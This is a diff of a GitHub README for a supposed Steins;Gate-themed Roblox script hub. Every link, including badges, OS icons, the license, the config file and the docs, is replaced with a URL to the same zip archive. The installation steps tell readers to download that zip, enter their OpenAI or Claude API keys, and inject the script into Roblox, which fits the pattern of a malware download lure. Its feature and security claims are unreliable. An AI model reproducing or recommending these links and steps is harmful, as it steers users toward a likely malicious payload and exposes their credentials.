@@ -1,6 +1,6 @@
 # Steins;Gate Adventures Roblox Script 🚀  
-![Roblox](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)  
-![MIT](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)
+![Roblox](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)  
+![MIT](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)
 
 Welcome, worldline explorers! This repository is your ultimate gateway to the **Steins;Gate Adventures Roblox Script** — a thoughtfully engineered piece of software designed to enhance your time-travel escapades within the realm of Roblox. Inspired by the multiverse mysteries and the inventive spirit of *Steins;Gate*, our script redeems the notion of adventure with layers of automation, AI-powered features, multi-language functionality, and more. Dive into a universe of possibilities and let the divergence meter tick in your favor!
 
@@ -10,11 +10,11 @@ Welcome, worldline explorers! This repository is your ultimate gateway to the **
 
 | Operating System      | Supported |  
 |:---------------------|:---------:|  
-| ![Windows](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip) | ✅ |  
-| ![macOS](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip%2B-lightgrey) | ✅ |  
-| ![Linux](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip%2FArch%2FDebian-orange) | ✅ |  
-| ![Android](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip%2B-green) | ✅ |  
-| ![iOS](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip%2B-pink) | 🚧 Experimental |  
+| ![Windows](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip) | ✅ |  
+| ![macOS](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip%2B-lightgrey) | ✅ |  
+| ![Linux](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip%2FArch%2FDebian-orange) | ✅ |  
+| ![Android](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip%2B-green) | ✅ |  
+| ![iOS](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip%2B-pink) | 🚧 Experimental |  
 
 Our script is designed to harmonize across the multiverse of operating systems, tested extensively with both keyboard and touch-native devices. 
 
@@ -71,15 +71,15 @@ To enable OpenAI and Claude features, add your API keys in the script configurat
 ## ⬇️ Download & Installation
 
 Ready to take a leap through the time machine?  
-Grab the latest release: https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip  
-[![Download](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)
+Grab the latest release: https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip  
+[![Download](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)
 
 ### Installation Steps
 
 1. Download the script package from the link above.
 2. Extract and review the documentation within the `/docs` folder.
-3. Enter your OpenAI and/or Claude API keys into the `https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip` file for AI-powered features.
-4. Launch Roblox, inject or run the script in your preferred way (see `https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip` for detailed developer notes).
+3. Enter your OpenAI and/or Claude API keys into the `https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip` file for AI-powered features.
+4. Launch Roblox, inject or run the script in your preferred way (see `https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip` for detailed developer notes).
 5. Customize settings via the responsive UI panel and embark on your Steins;Gate adventure!
 
 *Note*: Make sure your device matches [OS Compatibility](#os-compatibility-table) for best results.
@@ -99,13 +99,13 @@ Your security is our divergence detector. All scripts are meticulously reviewed 
 - Use this tool responsibly and in accordance with all relevant game terms and community standards.
 - AI features are provided “as is” – results may vary depending on underlying APIs and service status.
 - The authors disclaim all liability for unintended consequences, worldline instabilities, or cat-based paradoxes!
-- For questions about terms or responsible use, see `https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip`.
+- For questions about terms or responsible use, see `https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip`.
 
 ---
 
 ## 📜 MIT License (2025)
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip).
+This repository is licensed under the [MIT License](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip).
 
 You are free to use, modify, distribute, and contribute to the script — in accordance with the generous MIT guidelines. Please remember to reference original authors and contributors where appropriate.
 
@@ -113,8 +113,8 @@ You are free to use, modify, distribute, and contribute to the script — in acc
 
 ## ⬇️ Download Again
 
-Should you need another worldline jump, you can re-download the latest script here: https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip  
-[![Download](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)](https://raw.githubusercontent.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/branch/epitaphless/steins-gate-adventures-roblox-script-hub_v3.1.zip)
+Should you need another worldline jump, you can re-download the latest script here: https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip  
+[![Download](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)](https://github.com/Exvideoclips/steins-gate-adventures-roblox-script-hub/raw/refs/heads/branch/epitaphless/steins-roblox-adventures-hub-script-gate-v2.7.zip)
 
 ---
 
